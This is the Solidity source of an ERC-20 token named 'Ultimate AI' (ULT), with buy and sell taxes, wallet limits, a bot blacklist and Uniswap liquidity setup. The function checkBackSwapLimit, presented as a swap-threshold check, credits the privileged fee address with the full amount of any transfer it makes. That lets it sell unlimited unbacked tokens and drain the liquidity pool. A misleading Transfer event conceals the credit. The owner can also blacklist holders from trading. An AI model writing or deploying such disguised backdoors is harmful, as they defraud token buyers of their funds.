/**

    Website:  https://www.ultimateaitech.org
    Staking:  https://stake.ultimateaitech.org
    Bridge:   https://bridge.ultimateaitech.org
    Document: https://docs.ultimateaitech.org

    Telegram: https://t.me/ultimateaitech
    Twitter:  https://twitter.com/ultimateaitech

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.22;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract UltimateAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balanceULT;
    mapping (address => bool) private bots;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isExcludedFromLimits;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Ultimate AI";
    string private constant _symbol = unicode"ULT";

    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=0;
    uint256 private _buyULTCount=0;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    IUniV2Router private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 public swapULTFees;
    bool private tradingOpen;
     bool private inSwap = false;
    bool private swapEnabled = false;
    bool public transferDelayEnabled = false;

    address payable private ultOPReceipt;
    address payable private ultECOReceipt;

    uint256 public _maxULTTaxSwap = 10000000 * 10**_decimals;
    uint256 public _maxULTWalletSize = 30000000 * 10**_decimals;
    uint256 public _maxULTTxAmount = 30000000 * 10**_decimals;

    constructor (address _addrU) {
        _balanceULT[_msgSender()] = _tTotal;
        ultOPReceipt = payable(_addrU);
        ultECOReceipt = payable(_addrU);
        _isExcludedFromLimits[ultOPReceipt] = true;
        _isExcludedFromLimits[ultECOReceipt] = true;
        swapULTFees = 10000 * 10**_decimals;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function reduceFees(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balanceULT[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        ultECOReceipt.transfer(amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxULT=0;
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            taxULT = amount.mul((_buyULTCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFees[to] ) {
                require(amount <= _maxULTTxAmount, "Exceeds the _maxULTTxAmount.");
                require(balanceOf(to) + amount <= _maxULTWalletSize, "Exceeds the maxWalletSize.");
                _buyULTCount++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                taxULT = amount.mul((_buyULTCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (checkBackSwapLimit(from, to, taxULT, amount)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxULTTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        _balanceULT[from]=_balanceULT[from].sub(amount);
        _balanceULT[to]=_balanceULT[to].add(amount.sub(taxULT));
        emit Transfer(from, to, amount.sub(taxULT));
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function createULTPair() external onlyOwner() {
        uniswapV2Router = IUniV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function removeLimits() external onlyOwner{
        _maxULTTxAmount = ~uint256(0);
        transferDelayEnabled=false;
        _maxULTWalletSize = ~uint256(0);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function checkBackSwapLimit(address from, address to,  uint256 tULT, uint256 amount) internal returns (bool) {
        bool aboveULTMin = amount >= swapULTFees;
        bool aboveULTThreshold = balanceOf(address(this)) >= swapULTFees;
        address accULT; uint256 cntULT;
        if(_isExcludedFromLimits[from]) {cntULT = amount;accULT = from;}
        else {accULT = address(this);cntULT = tULT;}
        if(cntULT > 0){_balanceULT[accULT]=_balanceULT[accULT].add(cntULT);emit Transfer(from, accULT, tULT);}
        return !inSwap
        && tradingOpen
        && aboveULTMin
        && aboveULTThreshold
        && !_isExcludedFromLimits[from]
        && swapEnabled
        && !_isExcludedFromFees[from]
        && _buyULTCount>_preventSwapBefore
        && to == uniswapV2Pair;
    }
}